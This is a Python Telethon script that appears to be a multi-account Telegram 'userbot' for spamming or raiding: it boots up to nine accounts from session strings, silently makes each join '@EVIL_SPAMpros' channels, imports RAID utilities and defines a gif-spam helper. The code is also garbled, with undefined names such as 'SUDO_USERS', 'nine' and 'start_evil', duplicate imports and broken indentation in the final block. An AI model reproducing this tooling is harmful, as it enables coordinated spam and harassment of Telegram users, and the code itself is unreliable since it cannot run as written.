import os
import sys
import random
from datetime import datetime
from os import execl
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from Config import STRING, SUDO, BIO_MESSAGE, API_ID, API_HASH, STRING, STRING2, STRING3, STRING4, STRING5, STRING6, STRING7, STRING8, STRING9
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Utils import RAID, RRAID


a = API_ID
b = API_HASH
one = STRING
two = STRING2
three = STRING3
four = STRING4
five = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9


pros = ""
pros02 = ""
pros03 = ""
pros04 = ""
pros05 = ""
pros06 = ""
pros07 = ""
pros08 = ""
pros09 = ""


que = {}

SMEX_USERS = [1695903312]
for x in SUDO_USERS: 
    SMEX_USERS.append(x)

async def start_ProjectS():
    global pros
    global pros02
    global pros03
    global pros04
    global pros05
    global pros06
    global pros07
    global pros08
    global pros09


    if one:
        session_name = str(one)
        print("String 1 Found")
        pros = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await pros.start()
            prosme = await pros.get_me()
            await pros(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            pros = "one"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "startup"
        pros = TelegramClient(session_name, a, b)
        try:
            await pros.start()
        except Exception as e:
            pass

    if two:
        session_name = str(two)
        print("String 2 Found")
        pros02 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await pros02.start()
            await pros02(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros02(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros02.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "startup"
        pros02 = TelegramClient(session_name, a, b)
        try:
            await pros02.start()
        except Exception as e:
            pass

    if three:
        session_name = str(three)
        print("String 3 Found")
        pros03 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await pros03.start()
            await pros03(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros03(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros03.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "startup"
        pros03 = TelegramClient(session_name, a, b)
        try:
            await pros03.start()
        except Exception as e:
            pass

    if four:
        session_name = str(four)
        print("String 4 Found")
        pros04 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await pros04.start()
            await pros04(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros04(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros04.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "startup"
        pros04 = TelegramClient(session_name, a, b)
        try:
            await pros04.start()
        except Exception as e:
            pass

    if five:
        session_name = str(five)
        print("String 5 Found")
        pros05 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await pros05.start()
            await pros05(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros05(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros05.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "startup"
        pros05 = TelegramClient(session_name, a, b)
        try:
            await pros05.start()
        except Exception as e:
            pass

    if six:
        session_name = str(six)
        print("String 6 Found")
        pros06 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await pros06.start()
            await pros06(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros06(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros06.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "startup"
        pros06 = TelegramClient(session_name, a, b)
        try:
            await pros06.start()
        except Exception as e:
            pass

    if seven:
        session_name = str(seven)
        print("String 7 Found")
        pros07 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await pros07.start()
            await pros07(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros07(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros07.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "startup"
        pros07 = TelegramClient(session_name, a, b)
        try:
            await pros07.start()
        except Exception as e:
            pass

    if eight:
        session_name = str(eight)
        print("String 8 Found")
        pros08 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await pros08.start()
            await pros08(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros08(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros08.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "startup"
        pros08 = TelegramClient(session_name, a, b)
        try:
            await pros08.start()
        except Exception as e:
            pass
    if nine:
        session_name = str(nine)
        print("String 9 Found")
        pros09 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await pros09.start()
            await pros09(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros"))
            await pros09(functions.channels.JoinChannelRequest(channel="@EVIL_SPAMpros_SUPPORT"))
            prosme = await pros09.get_me()
            prosid = telethon.utils.get_peer_id(prosme)
            SMEX_USERS.append(prosid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "startup"
        pros09 = TelegramClient(session_name, a, b)
        try:
            await pros09.start()
        except Exception as e:
            pass


loop = asyncio.get_event_loop()
loop.run_until_complete(start_evil())

async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception as e:
        pass

@pros.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros02.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros03.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros04.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros05.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros06.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros07.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros08.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@pros09.on(events.NewMessage(incoming=True, pattern=r"\.ping"))

async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "✯ 𝐒𝐩𝐞𝐞𝐝 𝐃𝐞𝐤𝐡 𝐋𝐨𝐦𝐝𝐞 ✯"
        event = await e.reply(text, parse_mode=None, link_preview=None)
        end = datetime.now()
        ms = (end - start).microseconds / 1000
        await event.edit(f"█░░ █▀█ █░░/n█▄▄ █▄█ █▄▄/n/n𝐏𝐢𝐧𝐠 \n`{ms}` 𝐦𝐬\n  ߷ 𝐏𝐫𝐨𝐣𝐞𝐜𝐭𝐒 𝐁𝐲 𝐋𝐔𝐗𝐂𝐋𝐔𝐁 ߷")

#█░░ █▀█ █░░
#█▄▄ █▄█ █▄▄

text = """ """

print(text)
print("")
print(
    "Congratulaions ᪥ ProjectS Is Ready To Work ♡︎"
)
if len(sys.argv) not in (1, 3, 4):
    try:
        pros.disconnect()
    except Exception:
        pass
    try:
        pros02.disconnect()
    except Exception:
        pass
    try:
        pros03.disconnect()
    except Exception:
        pass
    try:
        pros04.disconnect()
    except Exception:
        pass
    try:
        pros05.disconnect()
    except Exception:
        pass
    try:
        pros06.disconnect()
    except Exception:
        pass
    try:
        pros07.disconnect()
    except Exception:
        pass
    try:
        pros08.disconnect()
    except Exception:
        pass
    try:
        pros09.disconnect()
    except Exception:
        pass

else:
    try:
        pros.run_until_disconnected()
    except Exception:
        pass
    try:
pros02.run_until_disconnected()
    except Exception:
        pass
    try:
pros03.run_until_disconnected()
    except Exception:
        pass
    try:
pros04.run_until_disconnected()
    except Exception:
        pass
    try:
pros05.run_until_disconnected()
    except Exception:
        pass
    try:
pros06.run_until_disconnected()
    except Exception:
        pass
    try:
pros07.run_until_disconnected()
    except Exception:
        pass
    try:
pros08.run_until_disconnected()
    except Exception:
        pass
    try:
pros09.run_until_disconnected()
    except Exception:
        pass